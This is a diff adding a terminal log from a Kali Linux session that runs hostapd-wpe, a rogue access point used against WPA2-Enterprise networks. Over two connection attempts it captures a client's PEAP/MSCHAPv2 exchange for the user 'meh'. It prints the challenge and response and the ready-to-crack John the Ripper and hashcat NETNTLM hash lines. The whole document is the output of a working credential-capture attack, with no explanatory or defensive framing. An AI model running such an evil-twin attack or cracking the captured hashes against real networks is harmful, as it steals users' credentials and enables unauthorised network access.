@@ -1,0 +1,59 @@
+┌──(kali㉿kali)-[~]
+└─$ sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+[sudo] password for kali: 
+wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED 
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: authenticated
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 84:cf:bf:91:c3:89
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+
+
+mschapv2: Wed May 31 12:12:57 2023
+         username:      meh
+         challenge:     c0:45:7a:75:4b:fb:11:9d
+         response:      5b:f1:d7:11:05:94:45:e3:2b:fa:f9:13:06:34:e3:b9:e4:e7:bf:34:3b:ed:b9:9c
+         jtr NETNTLM:           meh:$NETNTLM$c0457a754bfb119d$5bf1d711059445e32bfaf9130634e3b9e4e7bf343bedb99c
+         hashcat NETNTLM:       meh::::5bf1d711059445e32bfaf9130634e3b9e4e7bf343bedb99c:c0457a754bfb119d
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: CTRL-EVENT-EAP-FAILURE 84:cf:bf:91:c3:89
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: authenticated
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 84:cf:bf:91:c3:89
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+
+
+mschapv2: Wed May 31 12:13:02 2023
+         username:      meh
+         challenge:     fc:b0:03:7d:d1:21:c9:4f
+         response:      ed:fd:09:80:18:e9:ab:a1:79:77:aa:91:43:4c:48:b5:1b:60:08:de:52:5f:95:77
+         jtr NETNTLM:           meh:$NETNTLM$fcb0037dd121c94f$edfd098018e9aba17977aa91434c48b51b6008de525f9577
+         hashcat NETNTLM:       meh::::edfd098018e9aba17977aa91434c48b51b6008de525f9577:fcb0037dd121c94f
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: CTRL-EVENT-EAP-FAILURE 84:cf:bf:91:c3:89
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: deauthenticated due to local deauth request
+^Cwlan0: interface state ENABLED->DISABLED
+wlan0: AP-DISABLED                                                                                                
+wlan0: CTRL-EVENT-TERMINATING                                                                                     
+nl80211: deinit ifname=wlan0 disabled_11b_rates=0  
